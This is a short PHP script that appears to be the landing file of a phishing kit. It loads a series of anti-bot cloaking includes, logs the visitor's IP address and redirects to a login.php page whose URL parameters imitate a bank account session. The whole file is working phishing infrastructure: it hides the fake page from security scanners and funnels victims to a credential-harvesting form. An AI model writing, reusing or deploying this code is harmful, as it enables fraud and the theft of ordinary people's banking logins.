<?php
include('../bots/anti1.php');
include('../bots/anti2.php');
include('../bots/anti3.php');
include('../bots/anti4.php');
include('../bots/anti5.php');
include('../bots/anti6.php');
include('../bots/anti7.php');
include('../bots/anti8.php');
include('../bots/ant1.php');
include('../bots/ant2.php');
include('../bots/ant3.php');
include('../bots/ant4.php');
include('../bots/ant5.php');
include('../bots/ant6.php');
include('../bots/ant7.php');
include('../bots/ant8.php');
session_start();
include 'autob/bt.php';
include "autob/bts2.php";
$ib = $_SERVER['REMOTE_ADDR'];
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
header("Location:".$d."/login.php?ScrPg=".$ib."&ACCT.x=ID-DL=WF324=".$ran);
?>